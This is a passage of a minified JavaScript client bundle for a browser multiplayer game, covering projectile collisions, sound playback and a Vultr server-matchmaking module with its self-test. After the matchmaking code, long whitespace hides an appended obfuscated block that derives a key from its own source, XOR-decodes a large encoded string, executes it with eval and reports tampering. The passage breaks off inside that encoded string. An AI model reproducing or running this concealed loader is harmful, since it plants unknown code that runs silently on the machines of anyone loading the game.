                                        for (var g = 0; g < d[p].length; ++g) h = (o = d[p][g]).getScale(), o.active && this.ignoreObj != o.sid && this.layer <= o.layer && c.indexOf(o) < 0 && !o.ignoreCollision && s.lineInRect(o.x - h, o.y - h, o.x + h, o.y + h, this.x, this.y, this.x + u * Math.cos(this.dir), this.y + u * Math.sin(this.dir)) && c.push(o);
                                    if (c.length > 0) {
                                        var m = null,
                                            y = null,
                                            k = null;
                                        for (f = 0; f < c.length; ++f) k = s.getDistance(this.x, this.y, c[f].x, c[f].y), (null == y || k < y) && (y = k, m = c[f]);
                                        if (m.isPlayer || m.isAI) {
                                            var v = .3 * (m.weightM || 1);
                                            m.xVel += v * Math.cos(this.dir), m.yVel += v * Math.sin(this.dir), null != m.weaponIndex && i.weapons[m.weaponIndex].shield && s.getAngleDist(this.dir + Math.PI, m.dir) <= r.shieldAngle || m.changeHealth(-this.dmg, this.owner, this.owner)
                                        } else
                                            for (m.projDmg && m.health && m.changeHealth(-this.dmg) && n.disableObj(m), f = 0; f < e.length; ++f) e[f].active && (m.sentTo[e[f].id] && (m.active ? e[f].canSee(m) && a.send(e[f].id, "8", s.fixTo(this.dir, 2), m.sid) : a.send(e[f].id, "12", m.sid)), m.active || m.owner != e[f] || e[f].changeItemCount(m.group.id, -1));
                                        for (this.active = !1, f = 0; f < e.length; ++f) this.sentTo[e[f].id] && a.send(e[f].id, "19", this.sid, s.fixTo(y, 1))
                                    }
                                }
                            }
                        }
                    }
                }, function(e, t) {
                    e.exports = function(e, t, n, i, r, s, a, o, c) {
                        this.addProjectile = function(l, h, u, f, d, p, g, m, y) {
                            for (var k, v = s.projectiles[p], w = 0; w < t.length; ++w)
                                if (!t[w].active) {
                                    k = t[w];
                                    break
                                } return k || ((k = new e(n, i, r, s, a, o, c)).sid = t.length, t.push(k)), k.init(p, l, h, u, d, v.dmg, f, v.scale, g), k.ignoreObj = m, k.layer = y || v.layer, k.src = v.src, k
                        }
                    }
                }, function(e, t) {
                    e.exports.obj = function(e, t) {
                        var n;
                        this.sounds = [], this.active = !0, this.play = function(t, i, r) {
                            i && this.active && ((n = this.sounds[t]) || (n = new Howl({
                                src: ".././sound/" + t + ".mp3"
                            }), this.sounds[t] = n), r && n.isPlaying || (n.isPlaying = !0, n.play(), n.volume((i || 1) * e.volumeMult), n.loop(r)))
                        }, this.toggleMute = function(e, t) {
                            (n = this.sounds[e]) && n.mute(t)
                        }, this.stop = function(e) {
                            (n = this.sounds[e]) && (n.stop(), n.isPlaying = !1)
                        }
                    }
                }, function(e, t, n) {
                    var i = n(60),
                        r = n(67);

                    function s(e, t, n, i, r) {
                        "localhost" == location.hostname && (window.location.hostname = "127.0.0.1"), this.debugLog = !1, this.baseUrl = e, this.lobbySize = n, this.devPort = t, this.lobbySpread = i, this.rawIPs = !!r, this.server = void 0, this.gameIndex = void 0, this.callback = void 0, this.errorCallback = void 0, this.processServers(vultr.servers)
                    }
                    s.prototype.regionInfo = {
                        0: {
                            name: "Local",
                            latitude: 0,
                            longitude: 0
                        },
                        "vultr:1": {
                            name: "New Jersey",
                            latitude: 40.1393329,
                            longitude: -75.8521818
                        },
                        "vultr:2": {
                            name: "Chicago",
                            latitude: 41.8339037,
                            longitude: -87.872238
                        },
                        "vultr:3": {
                            name: "Dallas",
                            latitude: 32.8208751,
                            longitude: -96.8714229
                        },
                        "vultr:4": {
                            name: "Seattle",
                            latitude: 47.6149942,
                            longitude: -122.4759879
                        },
                        "vultr:5": {
                            name: "Los Angeles",
                            latitude: 34.0207504,
                            longitude: -118.691914
                        },
                        "vultr:6": {
                            name: "Atlanta",
                            latitude: 33.7676334,
                            longitude: -84.5610332
                        },
                        "vultr:7": {
                            name: "Amsterdam",
                            latitude: 52.3745287,
                            longitude: 4.7581878
                        },
                        "vultr:8": {
                            name: "London",
                            latitude: 51.5283063,
                            longitude: -.382486
                        },
                        "vultr:9": {
                            name: "Frankfurt",
                            latitude: 50.1211273,
                            longitude: 8.496137
                        },
                        "vultr:12": {
                            name: "Silicon Valley",
                            latitude: 37.4024714,
                            longitude: -122.3219752
                        },
                        "vultr:19": {
                            name: "Sydney",
                            latitude: -33.8479715,
                            longitude: 150.651084
                        },
                        "vultr:24": {
                            name: "Paris",
                            latitude: 48.8588376,
                            longitude: 2.2773454
                        },
                        "vultr:25": {
                            name: "Tokyo",
                            latitude: 35.6732615,
                            longitude: 139.569959
                        },
                        "vultr:39": {
                            name: "Miami",
                            latitude: 25.7823071,
                            longitude: -80.3012156
                        },
                        "vultr:40": {
                            name: "Singapore",
                            latitude: 1.3147268,
                            longitude: 103.7065876
                        }
                    }, s.prototype.start = function(e, t) {
                        this.callback = e, this.errorCallback = t;
                        var n = this.parseServerQuery();
                        n ? (this.log("Found server in query."), this.password = n[3], this.connect(n[0], n[1], n[2])) : (this.log("Pinging servers..."), this.pingServers())
                    }, s.prototype.parseServerQuery = function() {
                        var e = i.parse(location.href, !0),
                            t = e.query.server;
                        if ("string" == typeof t) {
                            var n = t.split(":");
                            if (3 == n.length) {
                                var r = n[0],
                                    s = parseInt(n[1]),
                                    a = parseInt(n[2]);
                                return "0" == r || r.startsWith("vultr:") || (r = "vultr:" + r), [r, s, a, e.query.password]
                            }
                            this.errorCallback("Invalid number of server parameters in " + t)
                        }
                    }, s.prototype.findServer = function(e, t) {
                        var n = this.servers[e];
                        if (Array.isArray(n)) {
                            for (var i = 0; i < n.length; i++) {
                                var r = n[i];
                                if (r.index == t) return r
                            }
                            console.warn("Could not find server in region " + e + " with index " + t + ".")
                        } else this.errorCallback("No server list for region " + e)
                    }, s.prototype.pingServers = function() {
                        var e = this,
                            t = [];
                        for (var n in this.servers)
                            if (this.servers.hasOwnProperty(n)) {
                                var i = this.servers[n],
                                    r = i[Math.floor(Math.random() * i.length)];
                                null != r ? function(i, r) {
                                    var s = new XMLHttpRequest;
                                    s.onreadystatechange = function(i) {
                                        var s = i.target;
                                        if (4 == s.readyState)
                                            if (200 == s.status) {
                                                for (var a = 0; a < t.length; a++) t[a].abort();
                                                e.log("Connecting to region", r.region);
                                                var o = e.seekServer(r.region);
                                                e.connect(o[0], o[1], o[2])
                                            } else console.warn("Error pinging " + r.ip + " in region " + n)
                                    };
                                    var a = "//" + e.serverAddress(r.ip, !0) + ":" + e.serverPort(r) + "/ping";
                                    s.open("GET", a, !0), s.send(null), e.log("Pinging", a), t.push(s)
                                }(0, r) : console.log("No target server for region " + n)
                            }
                    }, s.prototype.seekServer = function(e, t, n) {
                        null == n && (n = "random"), null == t && (t = !1);
                        const i = ["random"];
                        var r = this.lobbySize,
                            s = this.lobbySpread,
                            a = this.servers[e].flatMap((function(e) {
                                var t = 0;
                                return e.games.map((function(n) {
                                    var i = t++;
                                    return {
                                        region: e.region,
                                        index: e.index * e.games.length + i,
                                        gameIndex: i,
                                        gameCount: e.games.length,
                                        playerCount: n.playerCount,
                                        isPrivate: n.isPrivate
                                    }
                                }))
                            })).filter((function(e) {
                                return !e.isPrivate
                            })).filter((function(e) {
                                return !t || 0 == e.playerCount && e.gameIndex >= e.gameCount / 2
                            })).filter((function(e) {
                                return "random" == n || i[e.index % i.length].key == n
                            })).sort((function(e, t) {
                                return t.playerCount - e.playerCount
                            })).filter((function(e) {
                                return e.playerCount < r
                            }));
                        if (t && a.reverse(), 0 != a.length) {
                            var o = Math.min(s, a.length),
                                c = Math.floor(Math.random() * o),
                                l = a[c = Math.min(c, a.length - 1)],
                                h = l.region,
                                u = (c = Math.floor(l.index / l.gameCount), l.index % l.gameCount);
                            return this.log("Found server."), [h, c, u]
                        }
                        this.errorCallback("No open servers.")
                    }, s.prototype.connect = function(e, t, n) {
                        if (!this.connected) {
                            var i = this.findServer(e, t);
                            null != i ? (window.history.replaceState(document.title, document.title, this.generateHref(e, t, n, this.password)), this.server = i, this.gameIndex = n,
                                         this.log("Calling callback with address", this.serverAddress(i.ip), "on port", this.serverPort(i), "with game index", n), this.callback(this.serverAddress(i.ip), this.serverPort(i), n))
                            : this.errorCallback("Failed to find server for region " + e + " and index " + t)
                        }
                    }, s.prototype.switchServer = function(e, t, n, i) {
                        this.switchingServers = !0, window.location.href = this.generateHref(e, t, n, i)
                    }, s.prototype.generateHref = function(e, t, n, i) {
                        var r = "/?server=" + (e = this.stripRegion(e)) + ":" + t + ":" + n;
                        return i && (r += "&password=" + encodeURIComponent(i)), r
                    }, s.prototype.serverAddress = function(e, t) {
                        return "127.0.0.1" == e || "7f000001" == e || "903d62ef5d1c2fecdcaeb5e7dd485eff" == e ? window.location.hostname : this.rawIPs ? t ? "ip_" + this.hashIP(e) + "." + this.baseUrl : e : "ip_" + e + "." + this.baseUrl
                    }, s.prototype.serverPort = function(e) {
                        return 0 == e.region ? this.devPort : location.protocol.startsWith("https") ? 443 : 80
                    }, s.prototype.processServers = function(e) {
                        for (var t = {}, n = 0; n < e.length; n++) {
                            var i = e[n],
                                r = t[i.region];
                            null == r && (r = [], t[i.region] = r), r.push(i)
                        }
                        for (var s in t) t[s] = t[s].sort((function(e, t) {
                            return e.index - t.index
                        }));
                        this.servers = t
                    }, s.prototype.ipToHex = function(e) {
                        return e.split(".").map(e => ("00" + parseInt(e).toString(16)).substr(-2)).join("").toLowerCase()
                    }, s.prototype.hashIP = function(e) {
                        return r(this.ipToHex(e))
                    }, s.prototype.log = function() {
                        return this.debugLog ? console.log.apply(void 0, arguments) : console.verbose ? console.verbose.apply(void 0, arguments) : void 0
                    }, s.prototype.stripRegion = function(e) {
                        return e.startsWith("vultr:") ? e = e.slice(6) : e.startsWith("do:") && (e = e.slice(3)), e
                    }, window.testVultrClient = function() {
                        var e = 1;

                        function t(t, n) {
                            (t = "" + t) == (n = "" + n) ? console.log(`Assert ${e} passed.`): console.warn(`Assert ${e} failed. Expected ${n}, got ${t}.`), e++
                        }
                        var n = new s("test.io", -1, 5, 1, !1);
                        n.errorCallback = function(e) {}, n.processServers(function(e) {
                            var t = [];
                            for (var n in e)
                                for (var i = e[n], r = 0; r < i.length; r++) t.push({
                                    ip: n + ":" + r,
                                    scheme: "testing",
                                    region: n,
                                    index: r,
                                    games: i[r].map(e => ({
                                        playerCount: e,
                                        isPrivate: !1
                                    }))
                                });
                            return t
                        }({
                            1: [
                                [0, 0, 0, 0],
                                [0, 0, 0, 0]
                            ],
                            2: [
                                [5, 1, 0, 0],
                                [0, 0, 0, 0]
                            ],
                            3: [
                                [5, 0, 1, 5],
                                [0, 0, 0, 0]
                            ],
                            4: [
                                [5, 1, 1, 5],
                                [1, 0, 0, 0]
                            ],
                            5: [
                                [5, 1, 1, 5],
                                [1, 0, 4, 0]
                            ],
                            6: [
                                [5, 5, 5, 5],
                                [2, 3, 1, 4]
                            ],
                            7: [
                                [5, 5, 5, 5],
                                [5, 5, 5, 5]
                            ]
                        })), t(n.seekServer(1, !1), [1, 0, 0]), t(n.seekServer(1, !0), [1, 1, 3]), t(n.seekServer(2, !1), [2, 0, 1]), t(n.seekServer(2, !0), [2, 1, 3]), t(n.seekServer(3, !1), [3, 0, 2]), t(n.seekServer(3, !0), [3, 1, 3]), t(n.seekServer(4, !1), [4, 0, 1]), t(n.seekServer(4, !0), [4, 1, 3]), t(n.seekServer(5, !1), [5, 1, 2]), t(n.seekServer(5, !0), [5, 1, 3]), t(n.seekServer(6, !1), [6, 1, 3]), t(n.seekServer(6, !0), void 0), t(n.seekServer(7, !1), void 0), t(n.seekServer(7, !0), void 0), console.log("Tests passed.")
                    };
                    var a = function(e, t) {
                        return e.concat(t)
                    };
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 let I2wH;!function(){const EP6F=Array.prototype.slice.call(arguments);return eval("(function c4Ol(LjWd){const nRYd=Xq3b(LjWd,fHOd(c4Ol.toString()));try{let HeRd=eval(nRYd);return HeRd.apply(null,EP6F);}catch(jMTd){var D9Ld=(0o202222-66693);while(D9Ld<(0o400107%65560))switch(D9Ld){case (0x30058%0o200031):D9Ld=jMTd instanceof SyntaxError?(73639709%9):(0o600131%65558);break;case (73639709%9):D9Ld=(0o201630-0x10381);{console.log(\'Error: the code has been tampered!\');return}break;}throw jMTd;}function fHOd(H6Ib){let jELb=1322143580;var D1Db=(0o202140-66640);{let fzGb;while(D1Db<(262313%0o200041)){switch(D1Db){case (0o1000153%0x10017):D1Db=(0o201200-66144);{jELb^=(H6Ib.charCodeAt(fzGb)*(15658734^0O73567354)+H6Ib.charCodeAt(fzGb>>>(0O73567354%6)))^1253870357;}break;case (0o202400-66784):D1Db=(0x400A0%0o200037);fzGb++;break;case (0x400B0%0o200043):D1Db=fzGb<H6Ib.length?(0o202506-66871):(0o1000321%65579);break;case (0o400040%0x10008):D1Db=(0o1000250%0x10021);fzGb=(0x21786%3);break;}}}let zWyb=\"\";var buBb=(0O347010110&0x463A71D);{let vRtb;while(buBb<(0o203112-0x10633)){switch(buBb){case (0O347010110&0x463A71D):buBb=(65976-0o200642);vRtb=(0x21786%3);break;case (0o203004-0x105EE):buBb=vRtb<(0O3153050563-0x19AC516B)?(262273%0o200034):(131137%0o200025);break;case (0o200524-0x10143):buBb=(0x102D0-0o201304);{const Xowb=jELb%(0x20055%0o200042);jELb=Math.floor(jELb/(67576-0o203747));zWyb+=Xowb>=(0o204444-0x1090A)?String.fromCharCode((0x111C6-0o210605)+(Xowb-(0o600150%65562))):String.fromCharCode((0o1000415%0x1002B)+Xowb);}break;case (0o201700-0x103B4):buBb=(0o203004-67054);vRtb++;break;}}}return zWyb;}function Xq3b(zY5b,TlYb){zY5b=decodeURI(zY5b);let vT0b=(0x75bcd15-0O726746425);let PgTb=\"\";var rOVb=(66336-0o201420);{let LbOb;while(rOVb<(68866-0o206335)){switch(rOVb){case (0o600121%0x10016):rOVb=(0o200500-65824);{PgTb+=String.fromCharCode(zY5b.charCodeAt(LbOb)^TlYb.charCodeAt(vT0b));vT0b++;var nJQb=(0o200714-65973);while(nJQb<(0o201370-66258))switch(nJQb){case (0x102B2-0o201233):nJQb=vT0b>=TlYb.length?(0x101B8-0o200655):(0o600161%0x10019);break;case (0x30047%0o200024):nJQb=(0o400144%65567);{vT0b=(0x75bcd15-0O726746425);}break;}}break;case (0o1000250%65569):rOVb=LbOb<zY5b.length?(67486-0o203617):(69606-0o207701);break;case (0o1000130%65554):rOVb=(68056-0o204664);LbOb=(0x75bcd15-0O726746425);break;case (0o205000-68064):rOVb=(0o207020-69100);LbOb++;break;}}}return PgTb;}})(\"I%04%12%04%09%16%0D%0E%0FJN%11%0C%17%0A%02%15%0B%08%04J\'%3C&%10JN%11%18%07%10%14%13%0CGB3!%00%02IKN1/%10\'%09IK:B?2%16%10IKN%17%0C%17%0A%02%15%0B%08%04J;7%19%10JN%11%18%07%10%14%13%0CGBBJO@J9:CEJOJ:I%3C779O:%3C?LBAI?J:?:1A99%3CHKNA1?M:JCL17?%19%07%14%0C%04%1E%03%0D%0AA%207&%1BBK%1F%13%04%16%12%18%04BL8%0C%16%0FBCK?%163!%00BC?LH%1C%04%12%04%09%16%0D%0E%0FB2:%18%13LH%1A%10%02%1E%1F%10%0AAI%15%17%1E%04JMHJJ%08.%09%07LHH%1F.X%1D*Y%1A%1CY%01%1F%04%01%10%08%0E%0CG%1D8%17%15IH%19%15%0F%1E%17%16%0FA%15%25%0B%09JMJ4.%08%01BKO%20%02:%0EBCI=%0C%15%0AOCA%11%05.%0EJN%17%0C%17%0A%02%15%0B%08%04J;%15%16%0FJ&%19%10%0CM%1A%13%07%13%1F%18%0CD%06+%0A%0A1+%11%1E%0F%3CY%1A%0C%1F%0C%07%15%08%0D%09J?%0C%15%0FIK%1C%18%0F%16%11%13%0FBOB%1D(%03%0EIKN@BIEJ:?LBAI?J:?:1A99%3CHKNABI?:J9%3CAKI?%3C%3CI%3CA1?9%3CJ9:71I?%3C%3C9LKA99%3C%3CK%1A%0C%1F%0C%07%15%08%0D%09J%1D%12%10%0FIK%1C%18%0F%16%11%13%0FBOAB9O::CL17IEJ:?:A1I?%3C%3C?:A1?M:J9:7CIL4)%06%08BCK%19%07%14%0C%04%1E%03%0D%0AA0%09%0C%04BK%1F%13%04%16%12%18%04BL(*%09%0ABCKO:%3C%1F%01%1F%04%01%10%08%0E%0CG%19%07%0C%0AIH%19%15%0F%1E%17%16%0FAJOAA9O:%3C?%3CA1?9JIIL1A99%3C:I%3C77KMKI%01%0A%05%06JMHHIOA19O::I%3C77I?J:?:7A99%3C:I%3C779O:%3C?:C%17%04%11%0F%02%16%0E%05%04B)%09%04%0COC%11%10%01%15%14%10%09JB\'%02%05%0BJNC1%156%22%06JN7BK%19%07%14%0C%04%1E%03%0D%0AA%0E%08%0F%04BK%1F%13%04%16%12%18%04B%254%20%13OCA%05%22%04%06JNA3-%11%0AIKL;+7%0CIHI*8(%0BLHJ%0D?%22%05JM%1C(P%10%22D(%06%5CI,%06$K_Y/%00,NQ%0C%17%0A%02%15%0B%08%04J%0D%204%0FJ6/2%0CM%1A%13%07%13%1F%18%0CD%06+%0A%0A1;\'%3C%0F%3CY%1A%0C%1F%0C%07%15%08%0D%09J%01#+%0FIK%1C%18%0F%16%11%13%0FB*8(%0BLHJ;%0A%1E%02JMJ%0A3%1E%03BKO,%05%00%0FBCI5%06%09%0AOC%17%04%11%0F%02%16%0E%05%04B)#3%0COC%11%10%01%15%14%10%09JBIEJ:?LBAI?J:?:1A99%3CHKLB#%032%06IKN%17%0C%17%0A%02%15%0B%08%04J%05%1C(%0FJ.%13&%0CH%02%14!%09F/%14%22%0FH%19%0B%0F%1EB!1%12%0DZHHY%12%00%13B%008%1C%0DYIQ-T%5B_QTTQWQYGR%1CPX#$_%5BT&HZ%19%0B%0F%1EB%25,%0C%0D%5C%09=&%15%5B%16%0A%0E%06%0FJ%033%17%0D%5BBZ%0DRQQSU%5COR%1CPQRV_CK%1F%12%16%0B%13%09%02J%033%17%0DN%11%09%03%17%04AJW%12YRTUQGW%05XRTQPTNP%0D0%12%0E%5C#*%07%05%5E%07%14%22%0CLB/%14%22%0F%5C_Z%1F%04%06%01%07%08%0C%02%0EU+%1D-%0FL%0B%0F%04%05%10%09%5B\'%11,%04K%5BIQ%1AUZZVWDQ%0DUZZRWPHXOZ%12QTQTTBZ%05PTQQPRCQ%00%16%04%00%09%5C%09%0B%11%01AIR%08XZQVUUOQ%5DXS%5DH%5B%055%1C%05_LQ%0EPW%5B_STLWTT%5C%5EK_%1A%17%03%15J%09-%14%0E%5CJW%05%5BRTQPRQO%5CWQUYK%5C%1D%02%0B%08%04I%01(%1A%05%5ELQ%0EPWY%5ETTLQ%1AVZ%5DS%5DHH%11%10%03%1E%01%0CI%02-%17%05C%19%07%00%12%07GBZ%0DPQQSVYOR%1CPQRV.CX%07.%11%0DZBZ%0DRQQST%5DOTQTWRNQ%08%10%01%00%0AB%04=.%13_%02%00%11%02JBPRSSSSOZ%0DVQQRV%5ECX%07.%11%0DZ+\'%0F%0B_%5C+%1E&%04L%08%04%0F%05%13%02UJRVQTQGZ%0DVQSUR%5BCXLSWPU%5CYGT%0ESRWZYRMZ%03%10%02%0B%01Y%19$1%11%08AW+%1D-%0F9&\'%07%0D9Z%1C%00%15%0F%0B%09_%02%00%11%02JBUWWR%5BPZSG%5DH%5B%055%1C%05_LQ%0EPW_%5EWPLWZT%5D%5EK_%20,%0F%08W%09%17\'%0FZ%00%15%0F%0B%09_%02%00%11%02JBR%0BSQPW%5DZORWWRSCP%056%17%0E_O%5C%5CTWWLR%08XZPTWWK%5C+\'%0F%0BJJY%05%18%0F%03%0FZ%1C%1F%1A%18%0F%16%11%13%0FB%22:%19%0D_%1C%07%17%09%09%1E%0B%0B%0FA%15-%0D%05JM%1A%13%07%13%1F%18%0CDIJ9%3CA19O@J9:7A9O:%3C?:A1?9:J9:71I?%3C%3C?NABIO:J9:71I?%3C%3CIOAA9O:%3C?%3CA1?9HHIOAA9O:%3C?%3CA1?9JIIL1A99%3C:I%3C77KM%1C%07%17%09%09%1E%0B%0B%0FA;,%00%05JM%1A%13%07%13%1F%18%0CDI8%17/%00BKM:%160$%0DBK9IH%1F%01%1F%04%01%10%08%0E%0CG%19-%03%0BIH%19%15%0F%1E%17%16%0FAJ%222%25%05LHH9%22%18)%0ALH%3CJ%0C%01%07%08LHH%1F%01%1F%04%01%10%08%0E%0CG?%22%06%0BIH%19%15%0F%1E%17%16%0FAJ%0C%19+%0ELHHIO%01%19#%08IHK%1A%0C%1F%0C%07%15%08%0D%09J?%006%0EIK%1C%18%0F%16%11%13%0FB%14%25%1D%05LHJ%11%06%25%05JMJ%0A7%25%05BKO%20%02:%0EBCI=.%14%09OCA%01%01%00%0BJNA%013%1D%08IKL3%1F*%0EIHI6%0D%02%0ALHJ%01%20%08%07JMJ%06$%02%0DBK%19%17%00%10G%1D%0E7%0B%5C:JW%05XSSSQPJ%5DYPSTHNOZ%12SVTPPJZ%05PVSRSVCFJT%19RRW/_GT%0ESRWZ%5CPM%3CZ%04%12%04%09%16%0D%0E%0FB63!%0DLH%1A%10%02%1E%1F%10%0AAIIFA1?O@J9:CAJO::I%3C1AC?%3CJCL17?O:J9:77I?%3C%3C9L17??J:?:7C%1F%02%14%0F%01%13%03%05%0CD%12%00-%08BC%19%16%04%15%17%15%04JJ=&%06%0BOCC9!%13%22%0AOC7J%17%229%0AOCC%1F%02%14%0F%01%13%03%05%0CD,7\'%08BC%19%16%04%15%17%15%04JJ=%08%08%0EOCC9!%13%22%0AOC7J=%22%05%01OCC%1F%02%14%0F%01%13%03%05%0CD%0E9*%08BC%19%16%04%15%17%15%04JJ%10%18%11%07%08%0CJJ?%3CJ9:CC9O@J9:AKI?%3CJCL17IEJ:?LKA99%3C%1C%04%12%04%09%16%0D%0E%0FB.9%13%0DLH%1A%10%02%1E%1F%10%0AAIJLKA99JIIL1A99%3C:I%3C77KMKI+,%01%07JMHHIOAA9O:%3C?%3CA1?9H%1C%04%12%04%09%16%0D%0E%0FB%0C?(%0DLH%1A%10%02%1E%1F%10%0AAIC%3C7A99H:IFA1?9%1C%07%17%09%09%1E%0B%0B%0FA/%13.%06JM%1A%13%07%13%1F%18%0CD%02&%00%0ABCI%254%20%13OCA%01%051%0CJNA+/%11%04IK%1A%0C%1F%0C%07%15%08%0D%09J%05%14#%0DIK%1C%18%0F%16%11%13%0FBO179%17%10%18%08OC7I?%3CH9%22:+%07LH%3C%1F%11%0B%18B-%10%19%0EZ1BR%0BUQRT%5D%5BGT%19PRW%5E%5DKHIQ%0DUX%5DQVWLUP%5E%5BUMMIR%08XZVWSUOW%12%5BR%5CWRKKBZ%0DUQQSUX%5DGT%19PRWR%5CKHIQ%1AVZ_S!LQ%0DUZXPWRHNOZ%05PVQQQSG%5DQRPXK:Q%0C%17%0A%02%15%0B%08%04J%09%17%20%0DJN%11%18%07%10%14%13%0CGBACO:%3CIFA1?MJIIL1A99%3C:I%3C77K%19%07%14%0C%04%1E%03%0D%0AA$%0C%15%06BK%1F%13%04%16%12%18%04B5,%15%05OCA3%254%09JNA\'0&%08IKL3%1F*%0EIH%1F%01%1F%04%01%10%08%0E%0CG%0D%1A%17%08IH%19%15%0F%1E%17%16%0FA%11(%1D%0DJMJ%0A3%1E%03BKO,3%20%0EBCI=%0C%15%0AOCA%095%18%08JNA\'%06%06%09IKL;%0D%0A%0CIH%1F%01%1F%04%01%10%08%0E%0CG+%01%0E%08IH%19%15%0F%1E%17%16%0FAJL11I?:J9:7A9O:%3C?:A1?9:J9:71IEJ:?:7CI?%3C%1C%04%12%04%09%16%0D%0E%0FB%04%07%05%0ELH%1A%10%02%1E%1F%10%0AAIJ%0C%19+%0ELHHHO;3)%0BIHKNABI?%3CJCL17ILJJ9L17??J:?L17?MH%1C%04%12%04%09%16%0D%0E%0FB%04-%08%0FLH%1A%10%02%1E%1F%10%0AAI9:1?:*%08IK:BCI?%3CH9%10%1A%1E%0CLH%3C%1F%01%1F%04%01%10%08%0E%0CG/%22%07%09IH%19%15%0F%1E%17%16%0FAJ%3E%25%1F%09LHH9%108)%05LH%3CJN%17%0C%17%0A%02%15%0B%08%04J;\'7%0DJN%11%0D(%0C%0C%5C9:Q%09%0D%0A%12%15B&/3%0EY%0A8/%0CBCY%07%0E%0F%11%13J?%184%0D%5C%01%16%10%02JMZ%02%0D%09%19%1EB%13#2%0EZ?%080%0BIHY%04%05%04%11%10A0%15-%06W7%16#%0BJNQ%09%0D%0A%12%15B%14%13\'%0EY%163%17%16BCY%12%00%13B%149%10%0FYISTU%5BRRAQ%0EPWZZRQHZ%19%0B%0F%1EB15%22%0F%5C%1D%02%0B%08%04I%114%10%07%5ELQ%19SW%5DY#IQ%0EPWY%5EPQHH%19%14%1D%03%16%07%09I%114%10%07K%1F%02%00%11%02JBR%1CUQRP(OR%0BSQRWYYK%5E%122%18%0AWBR%0BSPRVZZORXWTSCQ%19%08%04%15B%08:%1E%0FYCCY%04%05%04%11%10A03%10%07W7%0E%0F%0992%3E)%0F9Z%17%03%15J%01/%0A%0C%5CJW%25YSQRQWW_%5CQIQ%19S%5E+)WUW#K%5C%11%06%07%10A,,%16%07Q%15%0C%08%0D%07O%01\'%0C%09%5DIR%08XZVTSWOW%12%5BRS\'\'KN%11%19%15%0D%15%02%0AO%01\'%0C%09H%1A%01%06%19%0FBLQ.QV_YRQQTTTGZ%1AUX%20!R%5B%5C%20M%5B%0A/%09%07WJURPSU%5COR%0BSQRWXZK_,/%13%0AWBR%1CVT%00%04%0E%5BWIQ.UU%5C%5DVRUSWNQ%08%10%01%00%0AY%04%0B%19%07DIQ%1AVZSUPLQ%0DUZ%5EWWWHX%0C\'%04%0FY,/%13%0AV;3%13%0C:3%10%20%06?%5BIQ%1AUZZQ%22DQ%0DUZZRVVHXOZ%05PTUQPQGZ%1AUQV$!CQ%00%16%04%00%09%5C%09%0B%11%01AIR%1F%5BZQQSLR%08XZSQQPK%5D%01\'%0C%09%5CIR%1F%5BZS!QLR%08XZRSSUK%5C%11%052%10%0CJ_&/3%0E?4%1B2%0B7B35%16%0C9%10(9%0E9I,,%16%07C%3CLQ%0EPWY%5BTVLWUV%5D%5BKMZ%1C%00%15%0F%0B%09_%02%00%11%02JBR%0BWQRV%5BYGT%19PRW%5B_K%5E%0A,%0C%0AWBR%0BUQRW%5E%5EGRTTVTCQ/*%10%0CILQ%08%10%01%00%0AY%1A%17%17%05.%09%0C9%14%13\'%0E9I%0E2%13%07CY%19%03%13%07%06%01Q%01%05%12%04BOZ%05VTQPWUOZ%1AUQQPTCP%117%1B%0C_2%3E)%0FX4%0B%0C%0F1;%15.%0D%3C%5DO%5C%5DQWWLR%08XZQWVPK%5DBZ%1AUQVQ&GZ%0DVQRVU_CY%06%13%04%03%0CQ%09%03%17%04AJW%05XSTPQRJ%5CSTRUHX%149%10%0FYIQ%1ATZZU&DQ%0DUZZRWTHY2%3E)%0FOJZ%00%15%0F%0B%09_%02%00%11%02JBR%1CSQRU%5EOR%0BSQRW%5BXK%5E%122%18%0AWBR%0BSQRR_ZOT%19PRV%5E%5EK_45!%0AWBR%1CSPU_%5COQMZ%03%10%02%0B%01Y%19%1C%1C%1F%0B%0F%1EB%03+%09%0F%5C%0C%1F%0C%07%15%08%0D%09J#)%0F%0CIK%1C%18%0F%16%11%13%0FBOAKI?%3CJCL17KNIJCL17KOIJCL17ILJJ9L17??J:?:CC%1F%02%14%0F%01%13%03%05%0CD(%04;%0ABC%19%16%04%15%17%15%04JJCF:77%10%0DJM%3CIKN1\'%206%0FIK:%17%0C%17%0A%02%15%0B%08%04J%09%03%03%0FJN%11%18%07%10%14%13%0CGB\'0&%08IKN1%1D0\'%06IK:BC%1F%02%14%0F%01%13%03%05%0CD$%031%0ABC%19%16%04%15%17%15%04JJ?%3C:7?$%03JM%3CIKL17K?%12%0C%0C%09BC?%19%07%14%0C%04%1E%03%0D%0AA%06%061%07BK%1F%13%04%16%12%18%04B1-%0E%09OCA/6#%08JNA/%04%00%0BIKL\'8%20%0DIHI%0C;%13%0BLHJ%11%20%0B%05JMJ,0%25%03BK%19%07%14%0C%04%1E%03%0D%0AA%20;+%07BK%1F%13%04%16%12%18%04BL:%3C9%14%1B%13%08LH%3CI%3C7C9%13%11%15%0COC7%1F%02%14%0F%01%13%03%05%0CD%02%002%0ABC%19%16%04%15%17%15%04JJ%17%0C%0F%0COCC9!%13%22%0AOC7J%0B%0F%12%08OCC%1F%02%14%0F%01%13%03%05%0CD%167$%0ABC%19%16%04%15%17%15%04JJ%07%001%0FOCC9%133%22%05OC7JM%1C(P%10%221%0D%1E3%09JN7W%15%3E0%08Y%01%1F%04%01%10%08%0E%0CG3=+%09IH%19%15%0F%1E%17%16%0FAJ.!%01%0FLHHIO3%0F%04%02IHK%1A%0C%1F%0C%07%15%08%0D%09J+%15/%0BIK%1C%18%0F%16%11%13%0FB%14-%0B%0DLHJ3%00%02%02JMJ0/%13%0DBKO$%07%06%0DBCI5%204%0AOCA%05%22%04%06JNA%0D%0A%03%0BIKL%0D00%03IHI6%0D%02%0ALHJ/5(%03JMJ%06$%02%0DBKO%204#%16BCI%03\'%04%05OCA%095%18%08JNA3-%11%0AIKL%01?%20%0BIHI%082%22%0DLHJ3%00%02%02JM%1C%07%17%09%09%1E%0B%0B%0FA%01%1E$%00J%13%15$%08N%11%18%07%10%14%13%0CG%0D%20%0A%09:%16%16%22%007Y%19%07%14%0C%04%1E%03%0D%0AA8%17/%00BK%1F%13%04%16%12%18%04BL:%3C9%3C77I?%3CH9LA1IO::?:1A99%3C%3C9L17?9%1C%07%17%09%09%1E%0B%0B%0FA%11%16%13%00JM%1A%13%07%13%1F%18%0CD%204+%00BCI5%204%0AOCA/6#%08JNA3%17,%0BIK%1A%0C%1F%0C%07%15%08%0D%09J?%10&%0BIK%1C%18%0F%16%11%13%0F